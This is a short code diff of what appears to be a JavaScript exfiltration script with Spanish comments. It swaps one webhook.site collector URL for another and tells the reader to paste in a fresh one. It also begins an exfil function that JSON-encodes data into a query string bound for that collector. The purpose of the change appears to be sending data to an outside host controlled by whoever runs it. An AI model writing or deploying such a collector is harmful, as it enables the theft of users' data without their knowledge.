@@ -9,7 +9,7 @@
   "use strict";
 
   // <<< EDITAR: pega tu propia URL fresca de webhook.site >>>
-  var COLLECTOR = "https://webhook.site/460362a0-a177-49a8-8cd4-1333797d53e2";
+  var COLLECTOR = "https://webhook.site/e2685b51-40e1-4e66-b0d1-2afb36a1d75f";
 
   function exfil(fase, datos) {
     var qs = encodeURIComponent(JSON.stringify(datos));
